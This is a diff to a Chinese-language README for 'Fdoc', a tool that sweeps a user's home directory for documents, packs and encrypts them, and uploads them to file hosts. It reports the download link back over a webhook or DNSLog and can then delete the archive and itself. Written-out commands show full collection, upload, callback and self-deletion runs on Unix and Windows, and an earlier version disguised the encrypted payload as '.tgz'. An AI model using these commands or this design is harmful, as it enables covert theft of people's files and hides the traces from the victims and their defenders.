@@ -48,23 +48,27 @@ Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
 |------|------|
 | `-d` | 扫描目录（默认用户家目录） |
 | `-o` | 输出路径（默认 `output_<时间>.tgz`） |
-| `-e` | 后缀：`documents`（默认）/ `all` / `any` / `pdf,txt,...` |
+| `-e` | 后缀：`documents`（默认）/ `all`（≠全部文件）/ `any`（不限后缀）/ `pdf,txt,...` |
 | `-f` | 文件名包含（逗号=或） |
-| `-k` | 文件内容包含（逗号=或；跳过二进制，单文件最多扫 8MB） |
+| `-k` / `-keyword` | 文件内容包含（逗号=或；推荐 `-keyword`，勿与 `-key` 混淆） |
 | `-t` | 只收该日期及以后修改的文件（`YYYY-MM-DD`） |
 | `-max` | 匹配文件累计逻辑大小上限（默认 1GB） |
 | `-max-file` | 单文件上限（默认 100MB，`0`=不限制） |
-| `-x` | 跳过目录（逗号分隔；设置后覆盖默认跳过列表） |
+| `-x` | 跳过目录（逗号分隔；设置后覆盖默认跳过列表；Windows 默认相对 home） |
 | `-size` | 只统计，不打包 |
-| `-q` / `-v` | 安静 / 详细 |
+| `-q` / `-v` | 安静 / 详细（`-v` 才输出每个后端 probe OK/FAIL） |
 | `-upload` | 打包后上传 |
-| `-b` | 指定上传渠道（默认按大小自动选） |
+| `-b` | 指定上传渠道（默认自动；列表：`Fdoc backends`） |
+| `-force` | 覆盖已存在的 `-o`；并允许 flaky/down 上传渠道 |
+| `-progress-interval` | 无进度条时上传/加密进度行间隔（分钟，默认 0.5=30s，`0`=关） |
 | `-webhook` | HTTPS 回传地址（可选） |
 | `-dns` | DNSLog 域名（可选，webhook 失败时备用） |
-| `-encrypt` / `-key` | 上传前加密 |
-| `-scrub` | 成功后删压缩包和程序自身 |
+| `-encrypt` / `-key` | 上传前加密（远端名为 `*.bin`） |
+| `-scrub` | 成功后删压缩包和程序自身（部分失败 exit 1） |
 
-退出码：`0` 成功，`1` 错误，`2` 触达 `-max`（部分包已保留；若开了 `-upload` 仍可能上传）。
+子命令：`Fdoc backends`、`Fdoc decrypt …`。
+
+退出码：`0` 成功，`1` 错误（含 `SCRUB_PARTIAL`），`2` 触达 `-max`（部分包已保留；若开了 `-upload` 仍可能上传）。
 
 ## 筛选规则
 
@@ -99,9 +103,9 @@ Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
 流程：打包 → 按体积自动选渠道上传 → **本地打印链接** 和/或 **远程回传** → 可选 `-scrub`。
 
 - **不配** `-webhook` / `-dns`：stderr 打 `UPLOAD_OK ...`，stdout 打下载 URL（方便脚本接）
-- **配了**：优先 webhook；失败或没配 webhook 再用 DNS。不是双发。
+- **配了**：优先 webhook；失败或没配 webhook 再用 DNS。不是双发。stderr 仍会 echo 裸 URL，便于本地查看。
 
-加密上传成功时 stderr 会看到 `ENCRYPT_OK plain=... cipher=... decrypt_first=1 ...`。下载文件虽可能叫 `*.tgz`，但**内容是密文**，必须以 `UP01` 开头，且**必须先 `Fdoc decrypt` 再解压**。
+加密上传成功时 stderr 会看到 `ENCRYPT_OK ... encrypted=1 decrypt_first=1 remote=….bin`。远端名为 **`*.bin`**（不再伪装成 `.tgz`），内容是密文，必须以 `UP01` 开头，且**必须先 `Fdoc decrypt` 再解压**。`UPLOAD_OK` 在 `-encrypt` 时也会带 `encrypted=1 decrypt_first=1`。
 
 ### 加密格式与解密
 
@@ -112,21 +116,21 @@ Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
 ```
 
 - 密钥：把 `SECRET` 按 PKCS7 方式填充到 **32 字节**，作为 AES-256 密钥（不是 PBKDF2）
-- 远端文件名仍用 `*.tgz`（`*.tar.gz` 会改成 `*.tgz`），方便过主机校验；**字节不是 gzip**，直接 `tar`/`gunzip` 会失败
+- 远端文件名统一为 `*.bin`（不用 `.encrypt`，tmpfiles 会拒；也不再用假 `.tgz`）
 - 可用 `xxd` 核对：文件头应为 `55 50 30 31`（`UP01`）；若是 `1f 8b` 则是明文 gzip，未加密
 - `cipher` 大小应等于 `ENCRYPT_OK` 里的 `cipher=`
-- **磁盘**：`-encrypt` 会在归档**同目录**写临时密文（不用 `/tmp`，避免 tmpfs），上传期间大约需要 **1× 归档大小** 的额外空间；若该目录不可写会回退到 `TempDir`（可能是 tmpfs，大文件需注意内存）。`Fdoc decrypt` 会写出完整明文（再约 1×），解密过程流式进行，不会把十几 GB 整包塞进内存。`-q` 只静默人类日志；`UPLOAD_OK` / `ENCRYPT_OK` / `DECRYPT_OK` 等机器行仍会输出。
+- **磁盘**：`-encrypt` 会在归档**同目录**写临时密文（不用 `/tmp`，避免 tmpfs），上传期间大约需要 **1× 归档大小** 的额外空间；若该目录不可写会回退到 `TempDir`（可能是 tmpfs，大文件需注意内存）。`Fdoc decrypt` 会写出完整明文（再约 1×），解密过程流式进行，不会把十几 GB 整包塞进内存。`-q` 只静默人类日志；机器行仍会输出。未加 `-q` 时上传会打印简短 `auto: probing…` / `auto: using …`；`-v` 才输出每个后端 OK/FAIL。默认 `-progress-interval` 为 **0.5 分钟（30 秒）**。
 
 解密（**必做**；推荐 Fdoc 自带子命令，无需 uploader 二进制）：
 
 ```shell
-Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.tgz
+Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.bin
 # -o 省略时：xxx.gz → xxx.tgz；若输入已是 xxx.tgz → xxx.dec.tgz（避免覆盖）
 # 已存在则加 -force
 tar -tzf recovered.tgz
 ```
 
-也可用：`uploader decrypt -k 'SECRET' -o recovered.tgz downloaded.tgz`。
+也可用：`uploader decrypt -k 'SECRET' -o recovered.tgz downloaded.bin`。
 
 ### Webhook
 
@@ -177,7 +181,9 @@ pbpaste | python3 scripts/dnslog_decode.py -q   # 只打印 URL
 ### `-scrub` 说明
 
 上传成功后执行；若配置了回传，还需回传成功。  
-**不保证**对方一定收到/存下链接。优先用 webhook；仅 DNS + `-scrub` 请谨慎。Windows 自删可能需要管理员权限（失败会打 `SCRUB_PARTIAL`）。
+**不保证**对方一定收到/存下链接。优先用 webhook；仅 DNS + `-scrub` 请谨慎。
+
+**Windows**：压缩包照常尝试删除。自删顺序为：立即删除 → 重命名 + 重启后删除（`MoveFileEx`，常需管理员）→ `%TEMP%` 下延迟 `cmd` 删除（无需管理员）。全部失败则 stderr 出现 `SCRUB_PARTIAL`。非管理员通常仍能删掉压缩包；删自身为 best-effort。
 
 Unix 下 `-upload` 会忽略 `SIGHUP`，降低会话断开导致中途被杀的概率。
 
@@ -207,6 +213,13 @@ Fdoc -d /data -e documents -o /tmp/x.tgz -upload \
 
 # 解密下载回来的密文
 Fdoc decrypt -key 'secret' -o /tmp/recovered.tgz ~/Downloads/xxx.bin
+
+# Windows（cmd / PowerShell；非 ASCII 路径建议 UTF-8 控制台）
+# 默认 -d 为 %USERPROFILE%；默认 -x 跳过 home 下 AppData 缓存
+Fdoc.exe -d %USERPROFILE%\Documents -e documents -o %TEMP%\docs.tgz
+Fdoc.exe -d %USERPROFILE% -o %TEMP%\home.tgz -upload -q
+# 扫整盘时自行加系统目录，例如：
+#   -x "C:\Windows,C:\Program Files,C:\Program Files (x86)"
 ```
 
 ## 编译
